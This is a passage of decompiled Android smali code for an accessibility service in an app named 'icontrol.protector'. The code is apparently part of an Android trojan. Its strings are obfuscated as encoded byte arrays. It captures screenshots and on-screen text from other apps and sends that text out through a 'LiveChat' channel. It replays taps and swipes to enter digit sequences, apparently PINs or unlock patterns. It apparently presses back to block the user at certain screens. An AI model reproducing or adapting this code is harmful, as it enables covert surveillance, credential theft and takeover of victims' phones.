    sput-object p0, Lcom/icontrol/protector/AccessServices;->U:Ljava/lang/String;

    goto :goto_1

    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Lcom/icontrol/protector/AccessServices;->U:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_1
    :goto_1
    sget-object p0, Lcom/icontrol/protector/AccessServices;->U:Ljava/lang/String;

    return-object p0

    :array_0
    .array-data 1
        0x42t
        -0x1ft
        -0x4et
    .end array-data

    :array_1
    .array-data 1
        -0x60t
        0x61t
        0x10t
        0x5dt
        -0x48t
        0x23t
        0x64t
        0x20t
    .end array-data
.end method

.method private static q()Z
    .locals 4

    .line 1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    sget-wide v2, Lcom/icontrol/protector/AccessServices;->W:J

    sub-long/2addr v0, v2

    const-wide/32 v2, 0x2bf20

    cmp-long v0, v0, v2

    if-gez v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method private r(Landroid/content/Context;Ljava/lang/String;Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 3

    .line 1
    const/16 v0, 0x14

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_1

    if-eqz p3, :cond_1

    const/16 p2, 0x38

    new-array p2, p2, [B

    fill-array-data p2, :array_2

    new-array v0, v1, [B

    fill-array-data v0, :array_3

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-static {p3, p2}, Lcom/icontrol/protector/a;->J(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p2

    const/4 v0, 0x2

    if-eqz p2, :cond_0

    :goto_0
    :try_start_0
    invoke-virtual {p0, v0}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    return-void

    :cond_0
    const/16 p2, 0x32

    new-array p2, p2, [B

    fill-array-data p2, :array_4

    new-array v1, v1, [B

    fill-array-data v1, :array_5

    invoke-static {p2, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-static {p3, p2}, Lcom/icontrol/protector/a;->J(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p2

    if-eqz p2, :cond_1

    invoke-static {p1}, Lcom/icontrol/protector/n;->E(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object p3

    if-eqz p3, :cond_1

    invoke-virtual {p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object p2

    invoke-interface {p2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p2, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_1

    goto :goto_0

    :cond_1
    return-void

    nop

    :array_0
    .array-data 1
        -0x2t
        -0x3at
        -0x66t
        0x2t
        -0x6ft
        -0x18t
        -0x5ct
        -0x5t
        -0xet
        -0x40t
        -0x6dt
        0x2t
        -0x7dt
        -0x1t
        -0x4dt
        -0x3t
        -0x8t
        -0x3ct
        -0x7et
        0x45t
    .end array-data

    :array_1
    .array-data 1
        -0x63t
        -0x57t
        -0x9t
        0x2ct
        -0x10t
        -0x7at
        -0x40t
        -0x77t
    .end array-data

    :array_2
    .array-data 1
        0x74t
        -0x7t
        -0x13t
        -0x54t
        0x6et
        -0x48t
        -0x2bt
        -0x2ft
        0x78t
        -0x1t
        -0x1ct
        -0x54t
        0x7ct
        -0x51t
        -0x3et
        -0x29t
        0x72t
        -0x5t
        -0xbt
        -0x15t
        0x35t
        -0x41t
        -0x2bt
        -0x74t
        0x71t
        -0xft
        -0xdt
        -0x23t
        0x62t
        -0x49t
        -0x21t
        -0x3et
        0x70t
        -0xdt
        -0xet
        -0x23t
        0x6et
        -0x5at
        -0x3ft
        -0x4t
        0x7et
        -0x1et
        -0x1bt
        -0x11t
        0x50t
        -0x5bt
        -0x3bt
        -0x34t
        0x67t
        -0x37t
        -0x1et
        -0x9t
        0x7bt
        -0x5et
        -0x22t
        -0x33t
    .end array-data

    :array_3
    .array-data 1
        0x17t
        -0x6at
        -0x80t
        -0x7et
        0xft
        -0x2at
        -0x4ft
        -0x5dt
    .end array-data

    :array_4
    .array-data 1
        -0x39t
        -0x48t
        0x2t
        0x4dt
        -0x4t
        0x4t
        -0x38t
        0x7at
        -0x35t
        -0x42t
        0xbt
        0x4dt
        -0x12t
        0x13t
        -0x21t
        0x7ct
        -0x3ft
        -0x46t
        0x1at
        0xat
        -0x59t
        0x3t
        -0x38t
        0x27t
        -0x3et
        -0x50t
        0x1ct
        0x3ct
        -0x10t
        0xbt
        -0x3et
        0x69t
        -0x3dt
        -0x4et
        0x1dt
        0x3ct
        -0x4t
        0x1at
        -0x24t
        0x57t
        -0x33t
        -0x5dt
        0xat
        0xet
        -0x3et
        0x6t
        -0x33t
        0x6at
        -0x3ft
        -0x45t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x5ct
        -0x29t
        0x6ft
        0x63t
        -0x63t
        0x6at
        -0x54t
        0x8t
    .end array-data
.end method

.method private s(Ljava/util/List;)V
    .locals 7

    .line 1
    if-eqz p1, :cond_2

    invoke-interface {p1}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    goto :goto_1

    :cond_0
    new-instance v0, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v0}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    new-instance v2, Landroid/graphics/Path;

    invoke-direct {v2}, Landroid/graphics/Path;-><init>()V

    const/4 v1, 0x0

    invoke-interface {p1, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/graphics/Point;

    iget v3, v1, Landroid/graphics/Point;->x:I

    int-to-float v3, v3

    iget v1, v1, Landroid/graphics/Point;->y:I

    int-to-float v1, v1

    invoke-virtual {v2, v3, v1}, Landroid/graphics/Path;->moveTo(FF)V

    const/4 v1, 0x1

    :goto_0
    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result v3

    if-ge v1, v3, :cond_1

    invoke-interface {p1, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/graphics/Point;

    iget v4, v3, Landroid/graphics/Point;->x:I

    int-to-float v4, v4

    iget v3, v3, Landroid/graphics/Point;->y:I

    int-to-float v3, v3

    invoke-virtual {v2, v4, v3}, Landroid/graphics/Path;->lineTo(FF)V

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_1
    new-instance p1, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v3, 0x0

    const-wide/16 v5, 0x352

    move-object v1, p1

    invoke-direct/range {v1 .. v6}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    invoke-virtual {v0, p1}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {v0}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object p1

    new-instance v0, Lcom/icontrol/protector/AccessServices$a;

    invoke-direct {v0, p0}, Lcom/icontrol/protector/AccessServices$a;-><init>(Lcom/icontrol/protector/AccessServices;)V

    const/4 v1, 0x0

    invoke-virtual {p0, p1, v0, v1}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    return-void

    :cond_2
    :goto_1
    const/16 p1, 0xd

    new-array p1, p1, [B

    fill-array-data p1, :array_0

    const/16 v0, 0x8

    new-array v1, v0, [B

    fill-array-data v1, :array_1

    invoke-static {p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    const/16 p1, 0x1e

    new-array p1, p1, [B

    fill-array-data p1, :array_2

    new-array v0, v0, [B

    fill-array-data v0, :array_3

    invoke-static {p1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    return-void

    :array_0
    .array-data 1
        -0x6at
        0x57t
        0x4dt
        0x5bt
        -0x71t
        -0x3ct
        0x59t
        -0x2dt
        -0x58t
        0x5at
        0x56t
        0x4ct
        -0x7ft
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x3at
        0x36t
        0x39t
        0x2ft
        -0x16t
        -0x4at
        0x37t
        -0x7at
    .end array-data

    :array_2
    .array-data 1
        0x2ct
        -0x68t
        -0x73t
        0x1t
        -0x6ft
        0x50t
        0x65t
        -0x20t
        0x1bt
        -0x64t
        -0x76t
        0x1dt
        -0x3ct
        0x4bt
        0x73t
        -0x20t
        0xet
        -0x70t
        -0x72t
        0x1t
        -0x63t
        0x2t
        0x6ft
        -0x4et
        0x4bt
        -0x6dt
        -0x75t
        0x19t
        -0x78t
        0xct
    .end array-data

    nop

    :array_3
    .array-data 1
        0x6bt
        -0x3t
        -0x2t
        0x75t
        -0x1ct
        0x22t
        0x0t
        -0x40t
    .end array-data
.end method

.method private t(I)V
    .locals 2

    .line 1
    int-to-long v0, p1

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method private u(Landroid/content/Context;)V
    .locals 2

    .line 1
    invoke-static {p1}, Lntidisestablish/neumonoul/floccinaucinih/oq;->b(Landroid/content/Context;)Lntidisestablish/neumonoul/floccinaucinih/oq;

    move-result-object v0

    invoke-virtual {v0, p1}, Lntidisestablish/neumonoul/floccinaucinih/oq;->a(Landroid/content/Context;)Landroid/app/Notification;

    move-result-object p1

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x22

    if-lt v0, v1, :cond_0

    sget v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->A:I

    const/4 v1, 0x1

    invoke-static {p0, v0, p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/v;->a(Lcom/icontrol/protector/AccessServices;ILandroid/app/Notification;I)V

    goto :goto_0

    :cond_0
    sget v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->A:I

    invoke-virtual {p0, v0, p1}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    :goto_0
    return-void
.end method


# virtual methods
.method public a(Landroid/content/Context;Ljava/lang/String;I)V
    .locals 2

    .line 1
    :try_start_0
    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->p:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v1, Lcom/icontrol/protector/AccessServices$d;

    invoke-direct {v1, p0, p2, p3, p1}, Lcom/icontrol/protector/AccessServices$d;-><init>(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;ILandroid/content/Context;)V

    const/4 p1, 0x0

    invoke-virtual {p0, p1, v0, v1}, Lcom/icontrol/protector/AccessServices;->takeScreenshot(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void
.end method

.method public b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;I)V
    .locals 7

    .line 1
    if-nez p1, :cond_0

    return-void

    :cond_0
    const/16 v0, 0x8

    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v2, ""

    if-eqz v1, :cond_1

    :try_start_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object p1

    :goto_0
    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    goto :goto_1

    :catch_0
    move-exception p1

    goto/16 :goto_3

    :cond_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v1

    if-eqz v1, :cond_2

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object p1

    goto :goto_0

    :cond_2
    move-object p1, v2

    :goto_1
    const/4 v1, 0x1

    new-array v3, v1, [B

    const/16 v4, -0x22

    const/4 v5, 0x0

    aput-byte v4, v3, v5

    new-array v4, v0, [B

    fill-array-data v4, :array_0

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v3, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    new-array v4, v1, [B

    const/16 v6, -0x2d

    aput-byte v6, v4, v5

    new-array v6, v0, [B

    fill-array-data v6, :array_1

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_4

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_4

    invoke-static {p3}, Lcom/icontrol/protector/a;->H(I)Ljava/lang/String;

    move-result-object p3

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array p2, v1, [B

    const/16 v3, 0x65

    aput-byte v3, p2, v5

    new-array v3, v0, [B

    fill-array-data v3, :array_2

    invoke-static {p2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array p2, v1, [B

    const/4 p3, 0x5

    aput-byte p3, p2, v5

    new-array p3, v0, [B

    fill-array-data p3, :array_3

    invoke-static {p2, p3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    const/16 p3, 0x9

    new-array p3, p3, [B

    fill-array-data p3, :array_4

    new-array v1, v0, [B

    fill-array-data v1, :array_5

    invoke-static {p3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p3

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p2, p3, v1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object p2

    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    if-eqz p2, :cond_3

    :try_start_2
    new-instance p2, Lorg/json/JSONObject;

    invoke-direct {p2}, Lorg/json/JSONObject;-><init>()V

    const/4 p3, 0x4

    new-array v1, p3, [B

    fill-array-data v1, :array_6

    new-array v2, v0, [B

    fill-array-data v2, :array_7

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v2, p3, [B

    fill-array-data v2, :array_8

    new-array v3, v0, [B

    fill-array-data v3, :array_9

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p3, p3, [B

    fill-array-data p3, :array_a

    new-array v1, v0, [B

    fill-array-data v1, :array_b

    invoke-static {p3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p3

    invoke-virtual {p2, p3, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {p2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-static {p0, p2}, Lcom/icontrol/protector/LiveChat;->g(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_2

    :catch_1
    move-exception p2

    :try_start_3
    invoke-virtual {p2}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_3
    :goto_2
    sget-object p2, Lcom/icontrol/protector/b$b;->f:Lcom/icontrol/protector/b$b;

    invoke-static {p1, p2}, Lcom/icontrol/protector/b;->c(Ljava/lang/String;Lcom/icontrol/protector/b$b;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_4

    :goto_3
    const/16 p2, 0xe

    :try_start_4
    new-array p2, p2, [B

    fill-array-data p2, :array_c

    new-array p3, v0, [B

    fill-array-data p3, :array_d

    invoke-static {p2, p3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_4

    :catch_2
    move-exception p1

    const/16 p2, 0xf

    new-array p2, p2, [B

    fill-array-data p2, :array_e

    new-array p3, v0, [B

    fill-array-data p3, :array_f

    invoke-static {p2, p3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const/16 p3, 0xb

    new-array p3, p3, [B

    fill-array-data p3, :array_10

    new-array v0, v0, [B

    fill-array-data v0, :array_11

    invoke-static {p3, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p3

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_4
    :goto_4
    return-void

    nop

    :array_0
    .array-data 1
        -0x7bt
        -0x3ft
        -0x6bt
        0x52t
        0x68t
        0x5at
        0x65t
        -0x3ct
    .end array-data

    :array_1
    .array-data 1
        -0x72t
        -0x71t
        0x71t
        -0x65t
        0x79t
        0x3t
        0x66t
        0x12t
    .end array-data

    :array_2
    .array-data 1
        0x19t
        -0x5ft
        -0x4t
        0x36t
        -0x6bt
        -0x36t
        0x51t
        -0x80t
    .end array-data

    :array_3
    .array-data 1
        0x79t
        -0x56t
        0x9t
        -0x3bt
        -0x7t
        -0x41t
        0x71t
        -0x48t
    .end array-data

    :array_4
    .array-data 1
        -0x9t
        0x69t
        -0x4ct
        -0x80t
        -0x2et
        -0x6t
        -0x75t
        -0xbt
        -0x4t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x45t
        0x20t
        -0x1et
        -0x3bt
        -0x73t
        -0x4ft
        -0x39t
        -0x46t
    .end array-data

    :array_6
    .array-data 1
        0x2t
        0x1bt
        0x46t
        -0x38t
    .end array-data

    :array_7
    .array-data 1
        0x76t
        0x62t
        0x36t
        -0x53t
        -0x71t
        -0x8t
        -0x27t
        -0x65t
    .end array-data

    :array_8
    .array-data 1
        -0x2bt
        0x16t
        0x6at
        -0x54t
    .end array-data

    :array_9
    .array-data 1
        -0x42t
        0x73t
        0x13t
        -0x21t
        0x2dt
        0x47t
        0x6dt
        -0x7ct
    .end array-data

    :array_a
    .array-data 1
        0x3bt
        0x5at
        -0x18t
        0x20t
    .end array-data

    :array_b
    .array-data 1
        0x5ft
        0x3bt
        -0x64t
        0x41t
        -0x16t
        0x76t
        -0x33t
        0x57t
    .end array-data

    :array_c
    .array-data 1
        -0x25t
        -0x5ft
        0x15t
        0x5ct
        -0x52t
        0x41t
        -0xct
        -0x6bt
        -0x1t
        -0x54t
        0x48t
        0x49t
        -0x41t
        0x49t
    .end array-data

    nop

    :array_d
    .array-data 1
        -0x66t
        -0x2bt
        0x3bt
        0x3dt
        -0x33t
        0x22t
        -0x26t
        -0x2t
    .end array-data

    :array_e
    .array-data 1
        -0x2ft
        0x7ct
        -0x36t
        0x10t
        0x2ft
        0x42t
        0x69t
        0x7ct
        -0x3at
        0x61t
        -0x7ft
        0x17t
        0x14t
        0x4ft
        0x74t
    .end array-data

    :array_f
    .array-data 1
        -0x70t
        0x8t
        -0x1ct
        0x60t
        0x5dt
        0x2bt
        0x7t
        0x8t
    .end array-data

    :array_10
    .array-data 1
        -0x47t
        -0x6et
        0x75t
        0x25t
        -0x28t
        0x11t
        0x37t
        -0x4at
        -0x6et
        -0x30t
        0x36t
    .end array-data

    :array_11
    .array-data 1
        -0x4t
        -0x16t
        0x16t
        0x40t
        -0x58t
        0x65t
        0x5et
        -0x27t
    .end array-data
.end method

.method public d(Landroid/content/Context;)V
    .locals 2

    .line 1
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/icontrol/protector/AccessServices$e;

    invoke-direct {v1, p0, p1}, Lcom/icontrol/protector/AccessServices$e;-><init>(Lcom/icontrol/protector/AccessServices;Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public f(Ljava/lang/String;Z)V
    .locals 0

    .line 1
    :try_start_0
    invoke-static {p1}, Lcom/icontrol/protector/a;->W(Ljava/lang/String;)V

    if-eqz p2, :cond_0

    sget-object p1, Lcom/icontrol/protector/AccessServices;->R:Ljava/util/Map;

    const/4 p2, -0x1

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p2

    invoke-interface {p1, p2}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/graphics/Point;

    if-eqz p1, :cond_0

    iget p2, p1, Landroid/graphics/Point;->x:I

    iget p1, p1, Landroid/graphics/Point;->y:I

    invoke-static {p2, p1}, Lcom/icontrol/protector/a;->y(II)Z

    :cond_0
    sget-object p1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    sput-object p1, Lcom/icontrol/protector/AccessServices;->B:Ljava/lang/Boolean;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    invoke-static {}, Lcom/icontrol/protector/a;->T()Lcom/icontrol/protector/AccessServices;

    const/4 p1, 0x0

    sput-boolean p1, Lcom/icontrol/protector/AccessServices;->A:Z

    return-void
.end method

.method public j()V
    .locals 5

    .line 1
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/icontrol/protector/AccessServices;->m:Z

    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getServiceInfo()Landroid/accessibilityservice/AccessibilityServiceInfo;

    move-result-object v1

    iget v2, v1, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    and-int/lit8 v2, v2, -0x5

    iput v2, v1, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    invoke-virtual {p0, v1}, Landroid/accessibilityservice/AccessibilityService;->setServiceInfo(Landroid/accessibilityservice/AccessibilityServiceInfo;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :try_start_1
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1e

    if-lt v1, v2, :cond_0

    new-instance v1, Landroid/graphics/Region;

    invoke-direct {v1}, Landroid/graphics/Region;-><init>()V

    new-instance v2, Landroid/graphics/Rect;

    iget v3, p0, Lcom/icontrol/protector/AccessServices;->g:I

    add-int/lit8 v3, v3, -0x3

    iget v4, p0, Lcom/icontrol/protector/AccessServices;->h:I

    add-int/lit8 v4, v4, -0x3

    invoke-direct {v2, v0, v0, v3, v4}, Landroid/graphics/Rect;-><init>(IIII)V

    sget-object v3, Landroid/graphics/Region$Op;->UNION:Landroid/graphics/Region$Op;

    invoke-virtual {v1, v2, v3}, Landroid/graphics/Region;->op(Landroid/graphics/Rect;Landroid/graphics/Region$Op;)Z

    invoke-virtual {p0, v0, v1}, Lcom/icontrol/protector/AccessServices;->setTouchExplorationPassthroughRegion(ILandroid/graphics/Region;)V

    invoke-virtual {p0, v0, v1}, Lcom/icontrol/protector/AccessServices;->setGestureDetectionPassthroughRegion(ILandroid/graphics/Region;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :cond_0
    return-void
.end method

.method public k(Ljava/lang/String;)V
    .locals 6

    .line 1
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    invoke-virtual {p1}, Ljava/lang/String;->toCharArray()[C

    move-result-object p1

    array-length v1, p1

    const/4 v2, 0x0

    move v3, v2

    :goto_0
    if-ge v3, v1, :cond_1

    aget-char v4, p1, v3

    invoke-static {v4}, Ljava/lang/Character;->getNumericValue(C)I

    move-result v4

    sget-object v5, Lcom/icontrol/protector/AccessServices;->R:Ljava/util/Map;

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-interface {v5, v4}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/graphics/Point;

    if-eqz v4, :cond_0

    invoke-interface {v0, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_0
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_1
    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result p1

    if-nez p1, :cond_2

    invoke-direct {p0, v0}, Lcom/icontrol/protector/AccessServices;->s(Ljava/util/List;)V

    :cond_2
    invoke-static {}, Lcom/icontrol/protector/a;->T()Lcom/icontrol/protector/AccessServices;

    sput-boolean v2, Lcom/icontrol/protector/AccessServices;->A:Z

    return-void
.end method

.method public l(Ljava/lang/String;Z)V
    .locals 5

    .line 1
    invoke-virtual {p1}, Ljava/lang/String;->toCharArray()[C

    move-result-object p1

    array-length v0, p1

    const/4 v1, 0x0

    move v2, v1

    :goto_0
    if-ge v2, v0, :cond_1

    aget-char v3, p1, v2

    invoke-static {v3}, Ljava/lang/Character;->getNumericValue(C)I

    move-result v3

    sget-object v4, Lcom/icontrol/protector/AccessServices;->R:Ljava/util/Map;

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

